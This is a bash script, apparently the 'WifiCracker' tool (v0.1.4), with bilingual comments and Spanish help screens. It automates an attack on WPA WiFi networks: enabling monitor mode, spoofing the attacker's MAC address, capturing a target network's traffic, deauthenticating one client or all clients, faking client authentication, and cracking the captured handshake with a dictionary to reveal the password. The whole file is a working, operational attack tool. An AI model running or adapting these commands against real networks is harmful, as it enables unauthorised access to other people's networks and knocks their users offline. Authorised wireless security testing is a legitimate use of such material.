# Programa en bash hecho para averiguar la contraseña de un Wifi por medio de
# deautenticación de clientes conectados a la misma - (https://github.com/Marcelorvp/WifiCracker)

# Program made in bash that allows you to obtain Wifi's passwords through clients de-authentication
# connected to the network - (https://github.com/Marcelorvp/WifiCracker)

# Copyright (c) 2016 Marcelo Raúl Vázquez Pereyra

#!/bin/bash

# ¡¡Debes de ejecutar el programa siendo superusuario!! [No hace falta estar conectado a
# ninguna red para ejecutar este programa]

# ¡¡You must run the program as root!! [Is not necessary to be connected at any network
# for running the program]


value=1
entrada=1
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

monitorMode(){

  #Tienes que ser root para ejecutar esta opción, de lo contrario no podrás

  #You must execute this option as root, otherwise you won't be able

  if [ "$(id -u)" = "0" ]; then
    echo " "
    echo -e "$greenColour Abriendo configuración de interfaz...$endColour"
    echo " "
    sleep 2
    ifconfig
    echo " "
    echo -n -e "$yellowColour Indique su tarjeta de red Wifi (wlan0, wlp2s0...): $endColour"
    read tarjetaRed
    echo " "
    echo -e "$greenColour Iniciando modo monitor...$endColour"
    sleep 2

    if [ "$value" = "1" ]; then

      # Al habilitar el modo monitor, capturamos y escuchamos cualquier tipo de
      # paquete que viaje por el aire. También capturamos no sólo a aquellos clientes
      # que estén conectados a la red, también los no asociados a ninguna (con sus
      # respectivas direcciones MAC).

      # Enabling monitor mode, we can capture and hear any kind of package travelling
      # in the air. Also we capture not only those users connected to the network,
      # also not-associated clientes (with their respectives MAC addresses).

      airmon-ng start $tarjetaRed
      value=2
      echo " "
      echo -e "$greenColour Dando de baja la interfaz mon0$endColour"
      echo " "
      sleep 2
      ifconfig mon0 down
      echo -e "$greenColour Cambiando direccion MAC...$endColour"
      echo " "
      sleep 2

      # A continuación vamos a cambiar nuestra dirección MAC, esto lo haremos para
      # realizar el 'ataque' de manera más segura en modo monitor. Para ello, siempre
      # que queramos realizar algún cambio en una interfaz, primero tenemos que darla
      # de baja. Posteriormente, al realizar los cambios... esta tendrá que ser
      # nuevamente dada de alta.

      # Next we are going to change our MAC address, we will do it for doing a safe
      # 'attack' on monitor mode. Whenever we want to make a change in an interface, first
      # we have to disable it. Later, when making changes ... this will have to be re-released.

      macchanger -a mon0
      echo " "
      echo -e "$greenColour Dando de alta la interfaz mon0$endColour"
      echo " "
      sleep 2
      ifconfig mon0 up
      value=2
      echo -e "$blueColour ¡Terminado!$endColour"
      sleep 3

      # Si quisiéramos comprobar que nuestra dirección MAC ha sido cambiada, podemos
      # hacer uso del comando 'macchanger -s mon0'. Esta nos mostrará 2 direcciones MAC,
      # una de ellas es la 'New MAC' que corresponde a la que el programa 'macchanger' nos
      # ha asignado aleatoriamente, la otra es la 'Permanent MAC', que corresponde a aquella
      # que nos volverá a ser otorgada una vez paremos el modo monitor, es decir... la misma
      # que teníamos desde un principio.

      # If we wanted to see if our MAC address has been changed, we can use 'macchanger -s mon0'.
      # This show us 2 MAC addresses, first is 'New MAC' corresponding to the random MAC program itself offers.
      # Second is 'Permanent MAC', corresponding to our real MAC adress, it will be refunded once we finish the process.

    else
      echo " "
      echo -e "$redColour No es posible, ya estás en modo monitor$endColour"
      echo " "
      sleep 4
    fi
  elif [ "$(id -u)" != "0" ]; then
    echo " "
    echo -e "$redColour Esto debe ser ejecutado como root$endColour"
    echo " "
    exit 1
fi
}

interfacesMode(){

  # Si ya ha has iniciado el modo monitor, verás que ahora en vez de tener 3 interfaces,
  # tienes 4, una de ellas siendo la 'mon0' correspondiente al modo monitor. Cuando la des
  # de baja o realices algún cambio, esta opción te permitirá ver qué está ocurriendo con las
  # interfaces.

  # If you have already started the monitor mode, you will see that now instead of having 3 interfaces,
  # you have 4, and one of them being 'mon0', corresponding to monitor mode. When desabling or enabling,
  # this option will show you what is happening on interfaces.

  echo " "
  echo -e "$greenColour Abriendo configuración de interfaz...$endColour"
  echo " "
  echo -e "$greenColour'mon0' corresponderá a la nueva interfaz creada, encargada de escanear las redes WiFi disponibles...$endColour"
  echo " "
  sleep 4
  ifconfig
  echo " "
  sleep 4

}

monitorDown(){

  echo " "
  echo -e "$greenColour Dando de baja el modo monitor...$endColour"
  echo " "
  sleep 2
  if [ "$value" = "2" ]; then

    # Con este comando detienes por completo el modo monitor. Siempre que quieras
    # volver a utilizarlo una vez parado, tendrás que volver a crearlo nuevamente
    # a través de la opción 1.

    # With this command, you stop the monitor mode. Whenever you want to use it
    # again once stopped... you'll have to create it again through option 1

    airmon-ng stop mon0
    echo " "
    echo -e "$blueColour Interfaz mon0 dada de baja con éxito$endColour"
    echo " "
    sleep 4
    value=1
  else
    echo -e "$redColour No hay interfaz mon0, tienes que iniciarla con la opción 1$endColour"
    sleep 3
  fi

}

wifiScanner(){

  if [ "$value" = "2" ]; then
    echo " "
    echo -e "$greenColour Van a escanearse las redes Wifis cercanas...$endColour"
    echo " "
    echo -e "$greenColour Una vez carguen más o menos todas las redes, presiona Ctrl+C$endColour"
    sleep 4

    # 'airodump-ng' nos permite analizar las redes disponibles a través de una
    # interfaz que le especifiquemos, en nuestro caso 'mon0'. Podría resultar
    # más simple hacer 'airodump-ng wlp2s0' con la propia tarjeta de red
    # directamente y acceder al escaneo de redes Wifi... pero el programa mismo
    # te avisará de que es necesario inicializar el modo monitor, de lo contrario
    # no te será permitido el escaneo de redes.

    # 'airodump-ng' allows us to analyze the available networks via an specific interface,
    # in our case... 'mon0'. It might be simpler to do 'airodump-ng wlp2s0' with our
    # own network card and access the scanning wireless networks ... but the program itself
    # will warn you it's necessary to initialize monitor mode, otherwise... you will not be
    # allowed to network scanning

    airodump-ng mon0
    echo " "
    echo -n -e "$yellowColour Red Wifi (ESSID) que quiere marcar como objetivo: $endColour"
    read wifiName
    echo " "
    echo -n -e "$yellowColour Marque el canal (CH) en el que se encuentra: $endColour"
    read channelWifi
    echo " "
    echo -n -e "$yellowColour Nombre que desea ponerle a la carpeta: $endColour"
    read folderName
    echo " "
    echo -n -e "$yellowColour Nombre que desea ponerle al archivo: $endColour"
    read archiveName
    echo " "
    echo -n -e "$yellowColour Escribe tu nombre de usuario del sistema: $endColour"
    read userSystem
    echo " "
    echo -e "$greenColour Se va a crear una carpeta en el escritorio, esta contendrá toda la información de la red Wifi seleccionada$endColour"
    echo " "
    sleep 4
    mkdir /home/$userSystem/Escritorio/$folderName
    cd /home/$userSystem/Escritorio/$folderName
    echo -e "$greenColour A continuación vamos a ver la actividad sólo en $wifiName $endColour "
    echo " "
    echo -e "$greenColour Abra otra terminal, y dejando en ejecución este proceso ejecute la opción 5$endColour"
    echo " "
    sleep 7

    # El siguiente comando también podemos usarlo con la sintaxis: airodump-ng -c ' ' -w ' ' --bssid '$wifiMAC' mon0
    # La 'essid' corresponde al nombre del Wifi, la 'bssid' a su dirección MAC. Con esto lo que hacemos es
    # centrarnos en el escaneo de una única red especificada pasada por parámetros, aislando el resto de redes.

    # The following command can also be use by the following syntax: airodump-ng -c '' -w '' --bssid '$ wifiMAC' mon0
    # 'essid' corresponding to the Wifi's name and 'bssid' to his MAC adress. What we are doing with this is focussing
    # on a unique network especified by parameters, isolating the other networks.

    airodump-ng -c $channelWifi -w $archiveName --essid $wifiName mon0

  else
    echo " "
    echo -e "$redColour Inicia el modo monitor primero$endColour"
    echo " "
    sleep 2
  fi

}

wifiPassword(){

  # Es posible que tengas que volver a hacer este proceso varias veces, ya que hay que esperar a que se genere el Handshake.
  # El Handshake se genera en el momento en el que el cliente se vuelve a reconectar a la red (esto no siempre es así, pero
  # por fines prácticos nos será de utilidad verlo de esta forma)

  # You may have to redo this process several times, because you have to wait for the handshake. The handshake is generated
  # when the customer is reconnected to the network (this is not always true, but for practical purposes we will say that)

  echo " "
  echo -e "$redColour Esta opción sólo deberías ejecutarla si ya has hecho los pasos 1, 4 y 5... de lo contrario no obtendrás nada$endColour"
  echo " "
  sleep 3
  echo " "
  echo -n -e "$yellowColour Nombre del diccionario (póngalo en el escritorio, con extensión correspondiente): $endColour"
  read dictionaryName
  echo " "
  echo -n -e "$yellowColour Nombre de la carpeta creada en el paso 4: $endColour"
  read folderName
  echo " "
  echo -n -e "$yellowColour Nombre del archivo creado en el paso 4 (Con extensión correspondiente '.cap'): $endColour"
  read archiveName
  echo " "
  echo -n -e "$yellowColour Escribe tu nombre de usuario del sistema: $endColour"
  read userSystem
  echo " "
  echo -e "$greenColour Vamos a proceder a averiguar la contraseña$endColour"
  echo " "
  sleep 5

  # La sintaxis de 'aircrack-ng' es -> "aircrack-ng -w rutaDiccionario rutaFichero". De todos los ficheros que
  # se han generado en la carpeta, el que nos interesa es el que tiene extensión '.cap'. A pesar de haber
  # especificado el nombre del fichero anteriormente a la hora de crearlo, échale un ojo al nombre dentro de la
  # carpeta de manera manual, puede que el nombre tenga ligeros cambios.

  # The syntax of 'aircrack-ng' is -> "aircrack-ng -w dictionaryRoute fileRoute". From all files that have been generated
  # in the folder, which interests us is the '.cap' extension file. Despite of the filename specified above, take a look
  # to the name again inside the folder, the name may have slight changes.

  aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
  sleep 10

}

resetProgram(){

  echo " "
  echo -e "$redColour Esta opción deberías escogerla en caso de haber ya estado usando las anteriores$endColour"
  sleep 4
  echo " "
  echo -e "$greenColour Dando de baja el modo monitor...$endColour"
  echo " "
  sleep 3
  airmon-ng stop mon0
  value=1

}

macAttack(){

  echo " "
  echo -n -e "$yellowColour Introduzca nombre del Wifi (ESSID): $endColour"
  read wifiName
  echo " "
  echo -n -e "$yellowColour Escriba la dirección MAC del usuario al que desea deautenticar (STATION): $endColour"
  read macClient
  echo " "
  echo -e "$greenColour Procedemos a enviar paquetes de deautenticación a la dirección MAC especificada$endColour"
  echo " "
  echo -e "$greenColour Es recomendable esperar 1 minuto$endColour"
  echo " "
  echo -e "$greenColour Cuando el minuto haya pasado, presione Ctrl+C para parar el proceso y desde una nueva terminal escoga la opción 7 $endColour"
  echo " "
  sleep 13

  # A continuación procederemos a deautenticar a un usuario de la red (echarlo de la red), para posteriormente esperar
  # a que se genere el Handshake. Si quisiéramos hacer un Broadcast para echar a todos los usuarios de la red y
  # esperar a que se genere el Handshake por parte de uno de los usuarios, tendríamos que especificar como dirección
  # MAC la siguiente -> FF:FF:FF:FF:FF:FF

  # Then we proceed to de-authenticate a network user, then we wait until handhsake is generated. If we want to make a
  # Broadcast for de-authenticate all users from the same network and wait for the Handshake, we need to specify as
  # MAC address -> FF:FF:FF:FF:FF:FF

  aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0

  # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
  # uno de los clientes, para posteriormente por fuerza bruta usar el diccionario, esto es de la siguiente forma:
  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0

  # We could have done a global deauthentication and wait until Handshake is generated, this is as follow:
  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0

}

# Escoge esta opción sólo si no hay clientes conectados a la red

# Choose this option only if there are no clients connected to the network

fakeAuth(){

  echo " "
  echo -e "$greenColour Vamos a proceder a autenticar un falso cliente en la red, desde la Terminal 1 podrás ver cómo este es añadido$endColour"
  echo " "
  echo -e "$greenColour Posteriormente, selecciona la opción 5 para mandar paquetes de deautenticación a dicho cliente$endColour"
  echo " "
  sleep 5
  echo -n -e "$yellowColour Escribe una dirección MAC (Puedes usar a clientes no asociados o tu propia dirección MAC [La nueva]): $endColour"
  read fakeMAC
  echo " "
  echo -n -e "$yellowColour Escribe el nombre del Wifi (ESSID): $endColour"
  read wifiName
  echo " "
  echo -e "$greenColour Procedemos...$endColour"
  echo " "
  sleep 3
  aireplay-ng -1 0 -e $wifiName -h $fakeMAC --ignore-negative-one mon0

}

necessaryPrograms(){

  echo " "
  echo -e "$greenColour Se va a instalar 'aircrack-ng' en tu ordenador, ¿quiere continuar?$endColour $blueColour(Si/No)$endColour"
  echo -n "-> "
  read respuestaA

  case $respuestaA in

    Si ) echo " "
         echo -e "$greenColour Comenzando la instalación...$endColour"
         echo " "
         sleep 2
         sudo apt-get install aircrack-ng
         echo " "
         ;;

    No ) echo " "
         echo -e "$redColour Instalación de 'aircrack-ng' cancelada...$endColour"
         echo " "
         sleep 3
         ;;
  esac

  echo -e "$greenColour Se va a instalar 'macchanger' en tu ordenador, ¿quiere continuar?$endColour $blueColour(Si/No)$endColour"
  echo -n -e "$yellowColour-> $endColour"
  read respuestaB

  case $respuestaB in

    Si ) echo " "
         echo -e "$greenColour Comenzando la instalación...$endColour"
         echo " "
         sleep 2
         sudo apt-get install macchanger
         echo " "
         ;;

    No ) echo " "
         echo -e "$redColour Instalación de 'macchanger' cancelada... $endColour"
         echo " "
         sleep 3
         ;;
  esac

}

autorInfo(){

  echo " "
  echo -e "$grayColour Programa hecho por Marcelo Raúl Vázquez Pereyra || Copyright 2016 © Marcelo Raúl Vázquez Pereyra$endColour"
  echo " "
  sleep 5

}

versionSystem(){

  echo " "
  echo -e "$grayColour WifiCracker (v0.1.4) - Copyright 2016 © Marcelo Raúl Vázquez Pereyra$endColour"
  echo " "
  sleep 5

}

panelHelp(){

  clear
  echo " "
  echo -e "$greenColour*******************************************************************************************$endColour"
  echo -e "$yellowColour  El primer paso es iniciar el modo monitor a través de la opción 1. Una vez iniciado
  el modo monitor... eres capaz de escuchar y capturar cualquier paquete que viaje por el aire.

  Puedes comprobar a través de la opción 2 si has iniciado correctamente la interfaz monitor.
  Posteriormente, analizarás redes WiFis disponibles en tu entorno mediante la opción 4. Te
  saldrán tanto clientes autenticados a una red como no asociados a ninguna. Cada cliente
  está situado en 'STATION' y poseen una dirección MAC. Estos verás que están conectados a
  una dirección MAC, correspondiente a la del routter (BSSID). Puedes ver de qué WiFi se trata
  viendo su 'ESSID' correspondiente.

  El programa te permitirá filtrar la red WiFi que deseas aislando el resto pasándole como
  parámetro el nombre de la misma. Si salen varias veces la misma red, se tratan de
  repartidores de señal. Una vez hecho esto una nueva carpeta será creada en el Escritorio
  con el nombre que desees, esta contendrá varios ficheros... entre los cuales viajará
  información encriptada, incluida la contraseña del routter. El que nos interesa es el de
  extensión '.cap'.

  Una vez creadas las carpetas y ficheros, procedes a de-autenticar a los usuarios de la red.
  En este caso te centrarás en un único usuario conectado a la red, para ello lo que harás
  será escoger la dirección MAC del mismo y pasársela como parámetro cuando te sea pedida.
  También se te permite la posibildad de realizar una de-autenticación global, de forma que
  echarías a todos los usuarios de la red exceptuándote a ti mismo en caso de que estés
  conectado a la misma, esto lo haces pasándole como dirección MAC -> FF:FF:FF:FF:FF:FF

  Una vez comience el 'ataque' y el usuario sea echado de la red, tendrás que parar el proceso
  de de-autenticación y esperar a que se reconecte. Cuando se reconecta se genera lo que se
  conoce como un 'Handshake', y es cuando capturamos la contraseña.

  Por tanto, una vez hecho todo este proceso, mediante la opción 7 especificamos 2 rutas,
  por un lado la del Diccionario (que deberá ser puesto en el Escritorio) y por otro la del
  fichero '.cap' que se nos generó en la opción 4. El programa comenzará a trabajar hasta
  averiguar la contraseña, la cual será mostrada en formato legible.

  Si te surgen dudas con alguna de las opciones, puedes usar '-h' acompañada de la opción
  para ver qué función principal tiene la misma.$endColour

$blueColour  Ejemplo -> '-h1, -h3, -h5...'$endColour

$greenColour**********************************************************************************************$endColour"
  echo " "
  echo -n -e "$blueColour Pulse <Enter> para volver al menú principal $endColour"
  read
}

showIP(){

echo " "
echo -n -e "$greenColour Tu IP pública es ->$endColour"
GET http://www.vermiip.es/ | grep "Tu IP p&uacute;blica es" | cut -d ':' -f2 | cut -d '<' -f1
echo " "
sleep 5

}

showMAC(){

  echo " "
  echo -e "$redColour  Para mostrar tu nueva dirección MAC desde la interfaz monitor es necesario que previamente lo
  hayas dado de alta a través de la opción 1. De lo contrario, obtendrás errores.$endColour"
  echo " "
  sleep 3
  echo -e "$greenColour Se va a mostrar tu nueva dirección MAC...$endColour"
  echo " "
  sleep 2
  macchanger -s mon0 | grep Current
  echo " "
  sleep 4
}

changeMAC(){

  echo " "
  echo -e "$redColour  Esta opción deberías ejecutarla en caso de haber ya iniciado el modo monitor a través de la opción 1.

  De lo contrario, obtendrás errores.$endColour"
  echo " "
  sleep 3
  echo -e "$greenColour Procedemos a cambiar nuevamente tu dirección MAC en la interfaz 'mon0'...$endColour"
  echo " "
  sleep 2
  ifconfig mon0 down
  echo " "
  macchanger -a mon0
  echo " "
  ifconfig mon0 up
  echo " "
  echo -e "$blueColour ¡Proceso Terminado!, puedes comprobar tu nueva dirección MAC a través de la opción 8$endColour"
  echo " "
  sleep 4
}

monitorHelp(){

  clear
  echo -e "$blueColour Opción 1$endColour "
  echo " "
  echo -e "$yellowColour  Esta opción te permite estar en modo monitor. La pregunta es por qué es tan necesario hacer
  esto y qué finalidad tiene este mismo proceso.

  Cuando tú estás en modo monitor, eres capaz de escuchar y capturar cualquier tipo de paquete que viaje por el aire.
  Es importante, puesto que debemos ser capaces de capturar las direcciones MAC de los clientes cercanos que tengamos
  conectados a una red, para posteriormente de-autenticarlos (echarlos de la red) y esperar a que se reconecten
  para capturar un Handshake. Por tanto esta opción es fundamental para iniciar todo el proceso que viene a continuación,
  de lo contrario todas las opciones que usemos darán error.

  Debe ser la primera opción que escojamos.$endColour"
  echo " "
  echo -n -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
  read

}

interfacesHelp(){

  clear
  echo -e "$blueColour Opción 2$endColour"
  echo " "
  echo -e "$yellowColour  Esta opción te muestra las interfaces que posees. Servirá para verificar en todo momento qué está
  sucediendo con la interfaz que estamos trabajando, ya que en esta se realizarán algunos cambios. Generalmente en un principio
  deberías tener 3 interfaces, a no ser que estés bajo una VPN... que tendrás una virtual de red más. La situada en la parte inferior
  es la tarjeta de red, tarjeta de la cual nos aprovecharemos para una vez estando en modo monitor... poder capturar las redes
  disponibles en nuestros alrededores.

  Podremos comprobar si estamos en modo monitor siempre que veamos una nueva interfaz llamada 'mon0'. En caso contrario, podrá
  resultar que la tenemos dada de baja o bien no la hemos creado, por tanto tendremos que acudir a la opción 1 para crearla.$endColour"
  echo " "
  echo -n -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
  read

}

monitorDownHelp(){

  clear
  echo -e "$blueColour Opción 3$endColour"
  echo " "
  echo -e "$yellowColour  Una vez hayamos conseguido nuestros objetivos, lo mejor es eliminar el modo monitor... pues de lo contrario
  lo tendremos inútilmente activado sin ser utilizado desde que salgamos del programa. Eliminarlo es distinto a darlo de baja, un monitor
  se da de baja para realizar configuraciones sobe él y posteriormente darlo de alta, porque de lo contrario cualquier tipo de cambio
  realizado estando en modo normal no nos será autorizado aún así siendo superusuario.

  En resúmen, con esta opción lo eliminamos completamente. Si queremos volver a darlo de alta, tendremos que usar la opción 1 nuevamente
  para crear un nuevo modo monitor."
  echo " "
  echo -n -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
  read

}

while true
  do
    if [ "$entrada" = "1" ]; then
      clear
      echo " "
      sleep 0.4
      echo -e "$greenColour*****************************************************************************$endColour"
      sleep 0.5
      echo -e "$redColour                        ╔╗╔╗╔╗─╔═╗╔═══╗───────╔╗$endColour                            $greenColour*$endColour"
      sleep 0.1
      echo -e "$redColour                        ║║║║║║─║╔╝║╔═╗║───────║║$endColour                            $greenColour*$endColour"
      sleep 0.1
      echo -e "$redColour                        ║║║║║╠╦╝╚╦╣║─╚╬═╦══╦══╣║╔╦══╦═╗$endColour                     $greenColour*$endColour"
      sleep 0.1
      echo -e "$redColour                        ║╚╝╚╝╠╬╗╔╬╣║─╔╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝$endColour  $blueColour(V0.1.4)$endColour           $greenColour*$endColour"
      sleep 0.1
      echo -e "$redColour                        ╚╗╔╗╔╣║║║║║╚═╝║║║╔╗║╚═╣╔╗╣║═╣║ $endColour                     $greenColour*$endColour"
      sleep 0.1
      echo -e "$redColour                        ─╚╝╚╝╚╝╚╝╚╩═══╩╝╚╝╚╩══╩╝╚╩══╩╝ $endColour                     $greenColour*$endColour"
      sleep 0.
      echo -e "$greenColour*****************************************************************************$endColour"
      sleep 0.5
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
      sleep 0.1
      echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour                                     $greenColour*$endColour"
      sleep 0.1
      echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour                                     $greenColour*$endColour "
      sleep 0.1
      echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour                                     $greenColour*$endColour "
      sleep 0.1
      echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour                                     $greenColour*$endColour "
      sleep 0.1
      echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
      sleep 0.1
      echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
      sleep 0.1
      echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
      sleep 0.1
      echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
      sleep 0.1
      echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
      sleep 0.1
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$greenColour*****************************************************************************$endColour"
      sleep 0.1
      echo -e "$purpleColour---------------------------------------------------$endColour"
      sleep 0.1
      echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
      sleep 0.1
      echo -e "$purpleColour---------------------------------------------------$endColour"
      sleep 0.1
      echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP pública$endColour $purpleColour|$endColour"
      echo -e "$purpleColour-------------------------------------$endColour"
      sleep 0.5

      echo " "
      entrada=2
    fi

    if [ "$entrada" = "2" ]; then
      clear
      echo " "
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
      echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour                                     $greenColour*$endColour"
      echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "$purpleColour---------------------------------------------------$endColour"
      echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
      echo -e "$purpleColour---------------------------------------------------$endColour"
      echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP pública$endColour $purpleColour|$endColour"
      echo -e "$purpleColour-------------------------------------$endColour"
      sleep 0.5

      echo " "
      entrada=3
    fi

    if [ "$entrada" = "3" ]; then
      clear
      echo " "
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "$redColour                        ╔╗╔╗╔╗─╔═╗╔═══╗───────╔╗$endColour                            $greenColour*$endColour"
      echo -e "$redColour                        ║║║║║║─║╔╝║╔═╗║───────║║$endColour                            $greenColour*$endColour"
      echo -e "$redColour                        ║║║║║╠╦╝╚╦╣║─╚╬═╦══╦══╣║╔╦══╦═╗$endColour                     $greenColour*$endColour"
      echo -e "$redColour                        ║╚╝╚╝╠╬╗╔╬╣║─╔╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝$endColour  $blueColour(V0.1.4)$endColour           $greenColour*$endColour"
      echo -e "$redColour                        ╚╗╔╗╔╣║║║║║╚═╝║║║╔╗║╚═╣╔╗╣║═╣║ $endColour                     $greenColour*$endColour"
      echo -e "$redColour                        ─╚╝╚╝╚╝╚╝╚╩═══╩╝╚╝╚╩══╩╝╚╩══╩╝ $endColour                     $greenColour*$endColour"
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
      echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour                                     $greenColour*$endColour"
      echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "$purpleColour---------------------------------------------------$endColour"
      echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
      echo -e "$purpleColour---------------------------------------------------$endColour"
      echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP pública$endColour $purpleColour|$endColour"
      echo -e "$purpleColour-------------------------------------$endColour"
      echo " "
      sleep 0.5
      entrada=4
    fi

    if [ "$entrada" = "4" ]; then
      clear
      echo " "
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "                                                                            $greenColour*$endColour"
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
      echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour                                     $greenColour*$endColour"
      echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
